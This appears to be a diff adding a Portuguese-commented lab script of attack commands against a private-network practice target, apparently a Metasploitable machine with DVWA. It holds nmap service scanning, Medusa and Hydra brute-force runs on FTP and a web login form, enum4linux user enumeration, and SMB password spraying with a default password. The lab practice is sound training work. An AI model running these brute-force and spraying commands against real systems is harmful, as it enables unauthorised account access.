@@ -1,0 +1,14 @@
+# 1. Reconhecimento de portas e serviços
+nmap -sV -p 21,80,139,445 192.168.56.105
+
+# 2. Cenário 1: Força bruta no FTP (Medusa)
+medusa -h 192.168.56.105 -U users.txt -P passwords.txt -M ftp
+medusa -h 192.168.56.105 -U users.txt -P passwords.txt -M ftp 2>&1 | grep -i "SUCCESS"
+
+# 3. Cenário 2: Automação no formulário Web - DVWA (Hydra)
+hydra -L users.txt -P passwords.txt 192.168.56.105 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" -V
+
+# 4. Cenário 3: Enumeração e Password Spraying no SMB
+enum4linux -U 192.168.56.105
+medusa -h 192.168.56.105 -U users.txt -p msfadmin -M smbnt
+medusa -h 192.168.56.105 -U users.txt -p msfadmin -M smbnt 2>&1 | grep -i "SUCCESS"
